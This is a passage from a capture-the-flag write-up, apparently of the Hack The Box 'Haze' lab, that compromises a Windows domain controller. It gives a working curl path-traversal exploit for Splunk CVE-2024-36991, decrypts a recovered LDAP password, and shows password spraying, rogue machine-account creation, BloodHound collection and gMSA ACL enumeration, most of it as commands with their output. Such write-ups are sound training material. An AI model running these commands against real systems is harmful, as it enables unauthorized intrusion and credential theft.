+| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
+8000/tcp open  http          syn-ack Splunkd httpd
+|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
+|_http-server-header: Splunkd
+| http-title: Site doesnt have a title (text/html; charset=UTF-8). 
+|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/
+8088/tcp open  ssl/http      syn-ack Splunkd httpd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/local
+ityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-03-05T07:29:08
+| Not valid after:  2028-03-04T07:29:08
+| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
+| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
+8089/tcp open  ssl/http      syn-ack Splunkd httpd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/local
+ityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-03-05T07:29:08
+| Not valid after:  2028-03-04T07:29:08
+| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
+| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
+
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-06-30T01:54:29
+|_  start_date: N/A
+|_clock-skew: 7h59m43s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 46282/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 43344/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 26877/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 16354/udp): CLEAN (Timeout)
+</pre>
+                    </div>
+                    
+
+                    <h3 id="initial-findings">Initial Findings and Analysis</h3>
+                    <p>Based on the Nmap scan results, we quickly identified that <span class="highlight">DC01 is clearly a Windows domain controller</span>, actively managing an Active Directory environment. This immediately set our expectations for common AD-related vulnerabilities and attack paths.</p>
+                    <p>Here's a summary of our key findings from this initial scan:</p>
+                    <ul>
+                        <li><strong>System Information</strong>
+                            <ul>
+                                <li>Hostname: <span class="highlight">DC01</span></li>
+                                <li>Domain: <span class="highlight">haze.htb</span></li>
+                                <li>Operating System: Microsoft Windows</li>
+                            </ul>
+                        </li>
+                        <li><strong>Open Ports and Services</strong>
+                            <ul>
+                                <li><strong>Domain Controller Services:</strong> The machine is running standard Active Directory services essential for a domain controller. This includes DNS on port 53, Kerberos on port 88, and LDAP services on 389/636/3268/3269. These are immediate points of interest for AD enumeration.</li>
+                                <li><strong>File Sharing:</strong> SMB/CIFS services are active on ports 139/445, indicating potential for credential testing and network share enumeration.</li>
+                                <li><strong>Splunk Installation:</strong> Intriguingly, Splunk services were detected on ports 8000 (HTTP web interface), 8088, and 8089 (HTTPS). This unexpected finding immediately shifted our focus to potential web application vulnerabilities.</li>
+                            </ul>
+                        </li>
+                    </ul>
+
+                    <h3 id="vulnerabilities-identified">Vulnerabilities Identified</h3>
+                    <p>During the initial enumeration, a critical vulnerability within the Splunk installation was pinpointed:</p>
+                    <ul>
+                        <li><strong>Splunk Path Traversal (CVE-2024-36991):</strong> The version of Splunk running on the target was found to be vulnerable to a <span class="highlight">path traversal flaw</span>. This type of vulnerability allows an attacker to read arbitrary files on the system, potentially exposing sensitive configuration files or credentials.</li>
+                        <li><strong>Exposed Credentials:</strong> The immediate goal with the path traversal was to obtain configuration files. This led us to <span class="highlight">authentication.conf</span>, which contained LDAP authentication configurations, including what appeared to be encrypted credentials.</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2 id="splunk-path-traversal"><i class="fas fa-folder-open"></i> 2. Exploiting Splunk Path Traversal (CVE-2024-36991)</h2>
+                    <p>The Splunk path traversal vulnerability presented an immediate and high-impact entry point. Our objective was to leverage this to read sensitive files that could provide authentication details or further insights into the system.</p>
+
+                    <h3 id="exploit-details">Exploit</h3>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">curl -s "http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/authentication.conf"</span></pre>
+                        <pre class="output">[splunk_auth]                                                      
+minPasswordLength = 8
+minPasswordUppercase = 0
+minPasswordLowercase = 0     
+minPasswordSpecial = 0
+minPasswordDigit = 0                                               
+
+[Haze LDAP Auth]
+SSLEnabled = 0
+anonymous_referrals = 1
+bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
+bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
+charset = utf8
+emailAttribute = mail
+enableRangeRetrieval = 0
+groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
+groupMappingAttribute = dn
+groupMemberAttribute = member
+groupNameAttribute = cn
+host = dc01.haze.htb
+nestedGroups = 0
+network_timeout = 20
+pagelimit = -1
+port = 389
+realNameAttribute = cn
+sizelimit = 1000
+timelimit = 15
+userBaseDN = CN=Users,DC=haze,DC=htb
+userNameAttribute = samaccountname
+
+[authentication]
+authSettings = Haze LDAP Auth
+authType = LDAP
+</pre>
+                    </div>
+                   
+
+                    <h3 id="extracted-info">Extracted Information</h3>
+                    <p>Successfully exploiting the path traversal vulnerability yielded critical information, setting the stage for the next phase of the attack:</p>
+                    <ul>
+                        <li><strong>LDAP Credentials:</strong> We successfully extracted the <span class="highlight">authentication.conf</span> file, which contained a bindDN for user "<span class="highlight">Paul Taylor</span>" and an encrypted password. This was a significant finding, as LDAP credentials are often reused or lead to domain service accounts.</li>
+                        <li><strong>LDAP Configuration:</strong> The configuration explicitly stated <span class="highlight">SSLEnabled = 0</span>, meaning the LDAP server was configured without SSL. This is a crucial detail for subsequent LDAP interactions, indicating that communications might be unencrypted.</li>
+                        <li><strong>Domain Structure:</strong> The baseDN was identified as <span class="highlight">DC=haze,DC=htb</span>, with user accounts located in <span class="highlight">CN=Users,DC=haze,DC=htb</span>. This provided us with the foundational understanding of the domain's structure.</li>
+                        <li><strong>Splunk Secret Key:</strong> Crucially, we were also able to extract the <span class="highlight">splunk.secret</span> file. This file is vital as it holds the key used by Splunk to encrypt and decrypt sensitive values within its configuration files, including passwords.</li>
+                    </ul>
+                   
+
+                    <h3 id="attack-path">Attack Path</h3>
+                    <p>Based on the wealth of information gathered from the Splunk exploit, a clear and viable attack path emerged:</p>
+                    <ol>
+                        <li><strong>Decrypt the LDAP bindDN password:</strong> Use the extracted <span class="highlight">splunk.secret</span> file to decrypt Paul Taylor's encrypted LDAP password.</li>
+                        <li><strong>Authenticate to Domain Services:</strong> Leverage Paul Taylor's newly decrypted credentials to attempt authentication against various domain services (SMB, LDAP, Kerberos).</li>
+                        <li><strong>Further Enumeration:</strong> With authenticated access, perform more in-depth enumeration of the Active Directory environment, searching for privilege escalation paths.</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h2 id="password-decryption"><i class="fas fa-key"></i> 3. Password Decryption and Initial Domain Access</h2>
+                    <p>With the <span class="highlight">splunk.secret</span> file in hand and an encrypted password, the next logical step was decryption. Successfully obtaining cleartext credentials would grant us our initial foothold in the domain.</p>
+
+                    <h3 id="splunk-password-decryption">Splunk Password Decryption</h3>
+                    <p>Using specialized tools designed for Splunk password decryption, combined with the <span class="highlight">splunk.secret</span> file, we successfully uncovered the cleartext password for the LDAP bind account.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">splunksecrets splunk-legacy-decrypt --splunk-secret splunk.secret 
+Ciphertext: $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
+Ld@p_Auth_Sp1unk@2k24</span></pre>
+                        <pre class="output">Decrypted Password: Ld@p_Auth_Sp1unk@2k24</pre>
+                    </div>
+                   
+                    <p>The decrypted password was <code class="highlight">Ld@p_Auth_Sp1unk@2k24</code>. This was a huge breakthrough!</p>
+
+                    <h3 id="username-enumeration">Username Enumeration & Authentication Testing</h3>
+                    <p>With the password, but an uncertain username format (e.g., paul.taylor, ptaylor, etc.), we employed <code class="highlight">username-anarchy</code> to generate variations for "Paul Taylor."</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze/username-anarchy-0.6$</span> <span class="command">./username-anarchy Paul Taylor</span></pre>
+                        <pre class="output">paul
+paultaylor
+paul.taylor
+paultayl
+pault
+p.taylor
+ptaylor
+tpaul
+t.paul
+taylorp
+taylor
+taylor.p
+taylor.paul
+pt</pre>
+                    </div>
+                   
+                    <p>We then systematically tested these different username formats against domain services using the decrypted password. This confirmed that <span class="highlight">paul.taylor</span> was the correct username format.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc smb 10.10.11.61 -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24'</span></pre>
+                        <pre class="output">SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True
+) (SMBv1:False)                                                                                                                        
+SMB         10.10.11.61     445    DC01             [-] haze.htb\paul:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE                       SMB         10.10.11.61     445    DC01             [-] haze.htb\paultaylor:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24                  </pre>
+                    </div>
+                    
+
+                    <h3 id="domain-users-enumeration">Domain Users Enumeration using <code class="highlight">--rid-brute</code></h3>
+                    <p>With <span class="highlight">paul.taylor</span>'s authenticated access, we attempted to enumerate domain users using RID bruteforcing. However, it quickly became apparent that <span class="highlight">paul.taylor had restricted privileges</span>, as we could only enumerate the user's own account. This indicated a low-privileged user and a need for further privilege escalation or data collection techniques.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc smb 10.10.11.61 -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute</span></pre>
+                        <pre class="output">SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True
+) (SMBv1:False)                                                                                                                        
+SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.10.11.61     445    DC01             498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             500: HAZE\Administrator (SidTypeUser)  
+SMB         10.10.11.61     445    DC01             501: HAZE\Guest (SidTypeUser)             
+SMB         10.10.11.61     445    DC01             502: HAZE\krbtgt (SidTypeUser)            
+SMB         10.10.11.61     445    DC01             512: HAZE\Domain Admins (SidTypeGroup)  
+SMB         10.10.11.61     445    DC01             513: HAZE\Domain Users (SidTypeGroup)     
+SMB         10.10.11.61     445    DC01             514: HAZE\Domain Guests (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             515: HAZE\Domain Computers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             516: HAZE\Domain Controllers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             517: HAZE\Cert Publishers (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             518: HAZE\Schema Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             519: HAZE\Enterprise Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             520: HAZE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             521: HAZE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             525: HAZE\Protected Users (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             526: HAZE\Key Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             527: HAZE\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             553: HAZE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             1000: HAZE\DC01$ (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1101: HAZE\DnsAdmins (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             1102: HAZE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1104: HAZE\mark.adams (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1105: HAZE\edward.martin (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1106: HAZE\alexander.green (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1107: HAZE\gMSA_Managers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1108: HAZE\Splunk_Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1109: HAZE\Backup_Reviewers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1112: HAZE\Support_Services (SidTypeGroup)</pre>
+                    </div>
+                   
+                    <p>Despite this limitation, the RID bruteforcing did provide some initial domain information, revealing various domain users and groups. Of particular interest was the highlighted "<span class="highlight">gMSA_Managers</span>" group, which strongly suggested potential access to Group Managed Service Accounts – a common and often lucrative privilege escalation vector in Active Directory environments.</p>
+                </section>
+
+                <section>
+                    <h2 id="gMSA"><i class="fas fa-server"></i> 4. Leveraging Group Managed Service Accounts (gMSA)</h2>
+                    <p>The discovery of the "<span class="highlight">gMSA_Managers</span>" group was a significant pivot point. Members of this group possess the ability to retrieve passwords for Group Managed Service Accounts (gMSAs), presenting a critical privilege escalation opportunity.</p>
+
+                    <h3 id="understanding-gmsa">Understanding gMSA Exploitation</h3>
+                    <p>Group Managed Service Accounts are specialized service accounts whose passwords are automatically managed by the domain controllers. They're designed for secure service principals without manual password rotation. However, members of the <span class="highlight">gMSA_Managers</span> group can extract the password blobs for these accounts, effectively compromising them. This is a classic example of privilege escalation through Active Directory group membership.</p>
+
+                    <h3 id="machine-account-creation">Machine Account Creation (Privilege Escalation for BloodHound)</h3>
+                    <p>To effectively map the entire AD environment and identify detailed attack paths, <span class="highlight">BloodHound</span> is indispensable. However, <span class="highlight">paul.taylor</span>'s low privileges severely limited the data we could collect. To overcome this, we leveraged a lesser-known feature: low-privileged users' ability to create a limited number of new computer/machine accounts within the domain. This would grant us slightly more privileged access, sufficient for BloodHound data collection.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">addcomputer.py -computer-name 'localhost$' -computer-pass 'StrongPassword!' -dc-host haze.htb -domain-netbios haze 'haze/paul.taylor:Ld@p_Auth_Sp1unk@2k24'   </span></pre>
+                        <pre class="output">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                  
+                                                                                                                                       
+[*] Successfully added machine account localhost$ with password StrongPassword!.                </pre>
+                    </div>
+                   
+                    <p>We successfully added a new computer account, <code class="highlight">localhost$</code>, to the <span class="highlight">haze.htb</span> domain using <span class="highlight">paul.taylor</span>'s compromised credentials.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc smb 10.10.11.61 -u 'localhost$' -p 'StrongPassword!' --users   </span></pre>
+                        <pre class="output">SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True
+) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [+] haze.htb\localhost$:StrongPassword! 
+SMB         10.10.11.61     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-            
+SMB         10.10.11.61     445    DC01             Administrator                 2025-03-20 21:34:49 0       Built-in account for admi
+nistering the computer/domain
+SMB         10.10.11.61     445    DC01             Guest                         <never>             0       Built-in account for gues
+t access to the computer/domain
+SMB         10.10.11.61     445    DC01             krbtgt                        2025-03-05 07:09:15 0       Key Distribution Center S
+ervice Account
+SMB         10.10.11.61     445    DC01             paul.taylor                   2025-07-01 00:18:07 0        
+SMB         10.10.11.61     445    DC01             mark.adams                    2025-07-01 00:18:07 0        
+SMB         10.10.11.61     445    DC01             edward.martin                 2025-07-01 00:18:07 0        
+SMB         10.10.11.61     445    DC01             alexander.green               2025-07-01 00:18:07 0        
+SMB         10.10.11.61     445    DC01             [*] Enumerated 7 local users: HAZE</pre>
+                    </div>
+                   
+                    <p>We verified that the newly created machine account <code class="highlight">localhost$</code> had basic domain access and could enumerate domain users, which confirmed its utility for BloodHound.</p>
+
+                    <h3 id="kerberos-ticket-acquisition">Kerberos Ticket Acquisition</h3>
+                    <p>To enable BloodHound's comprehensive data collection using the new machine account, we needed a Kerberos Ticket Granting Ticket (TGT). We used <code class="highlight">nxc</code> to log into the domain controller DC01 (10.10.11.61) with <code class="highlight">localhost$</code> and successfully generated a Kerberos ticket.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc smb 10.10.11.61 -u 'localhost$' -p 'StrongPassword!' --generate-krb5-file haze.htb</span></pre>
+                        <pre class="output">SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True
+) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [+] haze.htb\localhost$:StrongPassword! </pre>
+                    </div>
+                    
+                    <p>Next, we viewed the <span class="highlight">haze.htb</span> Kerberos configuration file (<code class="highlight">krb5.conf</code>). This file explicitly defines <span class="highlight">dc01.haze.htb</span> as the Key Distribution Center (KDC) and admin server for the <span class="highlight">HAZE.HTB</span> realm, overriding DNS lookups to ensure proper Kerberos authentication.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">cat haze.htb</span></pre>
+                        <pre class="output">[libdefaults]
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    default_realm = HAZE.HTB
+
+[realms]
+    HAZE.HTB = {
+        kdc = dc01.haze.htb
+        admin_server = dc01.haze.htb
+        default_domain = haze.htb 
+    }
+
+[domain_realm]
+    .haze.htb = HAZE.HTB
+    haze.htb = HAZE.HTB</pre>
+                    </div>
+                   
+                    <p>Finally, we used the Impacket script <code class="highlight">getTGT.py</code> to explicitly request a Ticket Granting Ticket (TGT) for the <code class="highlight">haze.htb/localhost$</code> machine account, using its password (StrongPassword!). The script successfully obtained the TGT and saved it to <code class="highlight">localhost$.ccache</code>. This TGT is crucial for subsequent Kerberos-based authentication and attacks, including running BloodHound-Python.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">getTGT.py 'haze.htb/localhost$:StrongPassword!'</span></pre>
+                        <pre class="output">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in localhost$.ccache</pre>
+                    </div>
+                    
+
+                    <h3 id="bloodhound-data">BloodHound Data Collection</h3>
+                    <p>With the <code class="highlight">localhost$.ccache</code> in hand, we executed <code class="highlight">bloodhound-python</code> to collect comprehensive information from the <span class="highlight">haze.htb</span> Active Directory domain. By setting <code class="highlight">KRB5CCNAME=localhost$.ccache</code> and using the <code class="highlight">-k</code> (Kerberos) flag, we instructed <code class="highlight">bloodhound-python</code> to use the previously obtained TGT for authentication, bypassing the need for a password. The <code class="highlight">-c all</code> flag ensured comprehensive data collection, including computers, users, groups, GPOs, and OUs from the domain controller <span class="highlight">dc01.haze.htb</span>. This data is crucial for visualizing complex attack paths within BloodHound.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">KRB5CCNAME=localhost\$.ccache bloodhound-python -k -c all -d haze.htb -dc dc01.haze.htb -u localhost$</span></pre>
+                        <pre class="output">INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+Password: 
+WARNING: Could not find a global catalog server, assuming the primary DC has this role
+If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
+INFO: Using TGT from cache
+INFO: Found TGT with correct principal in ccache file.
+INFO: Connecting to LDAP server: dc01.haze.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: dc01.haze.htb
+INFO: Found 9 users
+INFO: Found 57 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 20 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: 
+INFO: Querying computer: dc01.haze.htb</pre>
+                    </div>
+    
+                </section>
+
+                <section>
+                    <h2 id="password-spraying"><i class="fas fa-spray-can"></i> 5. Password Spraying for Lateral Movement</h2>
+                    <p>Having gathered initial credentials, a common next step in Active Directory engagements is to perform a password spray attack. This leverages a single, likely password against a large list of usernames, hoping for widespread reuse.</p>
+
+                    <h3 id="performing-spray">Performing the Password Spray</h3>
+                    <p>We executed a password spray attack against the <span class="highlight">haze.htb</span> domain controller (<span class="highlight">DC01</span>) using <code class="highlight">nxc smb</code>. We provided a list of usernames extracted from our earlier enumeration (<code class="highlight">all_users.txt</code>) and attempted to authenticate each one with the single password <code class="highlight">Ld@p_Auth_Sp1unk@2k24</code> (the one we decrypted earlier).</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc smb 10.10.11.61 -u all_users.txt -p 'Ld@p_Auth_Sp1unk@2k24' --continue-on-success</span></pre>
+                        <pre class="output">SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [-] haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\Guest:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\krbtgt:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.10.11.61     445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </pre>
+                    </div>
+                    
+                    <p>The output revealed that while many attempts resulted in <code class="highlight">STATUS_LOGON_FAILURE</code>, we successfully authenticated as <span class="highlight">paul.taylor</span> (which we already knew) and, crucially, <span class="highlight">mark.adams</span> using this password! This was a significant finding, providing us with a new, potentially higher-privileged user.</p>
+
+                    <h3 id="winrm-access">Confirming WinRM Access</h3>
+                    <p>To assess the immediate utility of <span class="highlight">mark.adams</span>'s credentials, we attempted to authenticate via SMB and WinRM. We first confirmed the validity of <span class="highlight">mark.adams</span>'s credentials by performing an SMB login to <span class="highlight">DC01</span> using <code class="highlight">nxc smb</code>, which was successful. Immediately after, we attempted a WinRM login to the same host using <code class="highlight">nxc winrm</code> with <span class="highlight">mark.adams</span>'s credentials. This also succeeded, indicating that <span class="highlight">mark.adams</span> has authenticated access to both SMB and WinRM services on the domain controller. The <code class="highlight">(Pwn3d!)</code> message signified successful privileged access.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">localhost@localhost-PC:~/ctf/hTB/labs/haze$</span> <span class="command">nxc smb 10.10.11.61 -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24'</span></pre>
+                        <pre class="output">WINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
+WINRM       10.10.11.61     5985   DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 (Pwn3d!)</pre>
+                    
+                    </div>
+                    
+                    <p class="highlight-box"><p><strong>Active Exploitation Path:</strong> With <span class="highlight">mark.adams</span>'s credentials and WinRM access, our next objective was clear: extract gMSA passwords (given the <span class="highlight">gMSA_Managers</span> group we identified) and potentially use them to access sensitive resources or elevate privileges further.</p></p>
+                </section>
+
+                <section>
+                    <h2 id="privilege-escalation"><i class="fas fa-arrow-up"></i> 6. Deep Dive into Privilege Escalation (Mark.Adams & gMSA)</h2>
+                    <p>The BloodHound data, combined with <span class="highlight">mark.adams</span>'s successful authentication, provided the perfect blueprint for our next phase: privilege escalation. The key was the <span class="highlight">gMSA_Managers</span> group.</p>
+                    <img src="../images/bloodhound_vis1.png" alt="BloodHound visualization of Mark.Adams permissions" class="inline-image"> <!-- Replace with your BloodHound Mark.Adams screenshot -->
+                    <h3 id="mark-adams-permissions">BloodHound Visualization: Mark.Adams Permissions</h3>
+                    <p>The BloodHound visualization after the <span class="highlight">mark.adams</span> compromise immediately highlighted crucial group memberships and potential lateral movement paths:</p>
+                    
+                    <ul>
+                        <li><span class="highlight"><strong>MARK.ADAMS is a MemberOf:REMOTE MANAGEMENT USERS@HAZE.HTB:</strong></span> This group membership strongly suggests <span class="highlight">mark.adams</span> has permissions for remote management tasks, likely via WinRM, RDP, or other management protocols on various domain machines. This aligns perfectly with our successful WinRM login.</li>
+                        <li><span class="highlight"><strong>GMSA_MANAGERS@HAZE.HTB:</strong></span> This is the most critical group. Membership in <span class="highlight">GMSA_MANAGERS</span> implies that <span class="highlight">mark.adams</span> has privileges related to managing Group Managed Service Accounts (gMSAs), including potentially reading their passwords or controlling who can read them. This was a clear pathway to compromise gMSAs.</li>
+                        <li><span class="highlight">DOMAIN USERS@HAZE.HTB:</span> This is a default group for all domain user accounts.</li>
+                    </ul>
+                    <p>This BloodHound data provided key insights into the potential lateral movement paths and privilege escalation opportunities available through the <span class="highlight">mark.adams</span> account, particularly highlighting its role in gMSA management.</p>
+
+                    <h3 id="enumerating-gmsas">Enumerating gMSAs via Evil-WinRM</h3>
+                    <p>While in our Evil-WinRM shell as the <span class="highlight">mark.adams</span> user, we executed the PowerShell command <code class="highlight">Get-ADServiceAccount -Filter *</code>. This command allowed us to enumerate all Group Managed Service Accounts (gMSAs) within the Active Directory domain. The output successfully identified the <span class="highlight">Haze-IT-Backup$</span> gMSA, providing details such as its Distinguished Name, SamAccountName, and SID, which are crucial for targeting it in further attacks.</p>
+                    <div class="terminal-code">
+                        <pre><span class="prompt">*Evil-WinRM* PS C:\Users&gt;</span> <span class="command">Get-ADServiceAccount -Filter *</span></pre>
+                        <pre class="output">DistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
+Enabled           : True
+Name              : Haze-IT-Backup
+ObjectClass       : msDS-GroupManagedServiceAccount
+ObjectGUID        : 66f8d593-2f0b-4a56-95b4-01b326c7a780
+SamAccountName    : Haze-IT-Backup$
+SID               : S-1-5-21-323145914-28650650-2368316563-1111
+UserPrincipalName :
+
+</pre>
+                    </div>
+                   
+
+                    <h3 id="identifying-acls">Identifying ACLs for gMSA Password Retrieval</h3>
+                    <p>Next, after uploading the <span class="highlight">PowerView</span> penetration testing toolkit, we executed the PowerShell command <code class="highlight">Find-InterestingDomainAcl</code>. This command was used to identify interesting Active Directory Access Control Lists (ACLs), specifically filtering for those related to the <span class="highlight">GMSA_MANAGERS</span> group. The output confirmed that the <span class="highlight">GMSA_MANAGERS</span> group has <span class="highlight">WriteProperty</span> rights over the <span class="highlight">ms-DS-GroupMSAMembership</span> property of the <span class="highlight">Haze-IT-Backup$</span> gMSA. This confirmed that members of <span class="highlight">GMSA_MANAGERS</span> (like <span class="highlight">mark.adams</span>) could control who could retrieve the <span class="highlight">Haze-IT-Backup$</span> gMSA's password.</p>
+                    <div class="terminal-code">
